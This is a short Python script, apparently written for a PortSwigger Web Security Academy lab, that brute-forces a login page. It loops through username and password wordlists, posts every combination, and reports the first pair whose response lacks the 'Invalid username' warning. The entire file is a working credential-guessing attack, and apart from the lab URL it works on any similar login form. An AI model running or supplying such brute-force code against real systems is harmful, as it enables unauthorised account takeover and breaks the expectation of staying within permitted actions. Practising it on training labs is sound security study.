import requests
import sys
from bs4 import BeautifulSoup

# Target login URL
target = "https://0a7700de04b3a0fb80c2ade600e1007d.web-security-academy.net/login"

# Input files for usernames and passwords
usernames_file = "users.txt"
passwords_file = "pass.txt"

# Expected text and HTML class indicating failed login
needle = "Invalid username"
expected_class = "is-warning"

with open(usernames_file, 'r') as usernames:
    for username in usernames:
        username = username.strip()  # Remove newline and whitespace

        with open(passwords_file, 'r') as passwords:
            for password in passwords:
                password = password.strip()

                # Show which credentials are being tried
                print(f"[X] Attempting user:pass -> {username}:{password}")
                sys.stdout.flush()

                # Send POST request with credentials
                response = requests.post(target, data={"username": username, "password": password})

                # Parse HTML response to extract warning messages
                soup = BeautifulSoup(response.content, "html.parser")
                elements = soup.find_all(class_=expected_class)

                # Print any text found in elements with the target class
                for i, element in enumerate(elements, 1):
                    print(f"[{i}] {element.get_text(strip=True)}\n")

                # Check if login was successful (needle not found)
                if needle not in response.text:
                    print(f"\n[>>>] Valid password '{password}' found for user '{username}'!")
                    sys.exit()

            print(f"\nNo valid password found for '{username}'")
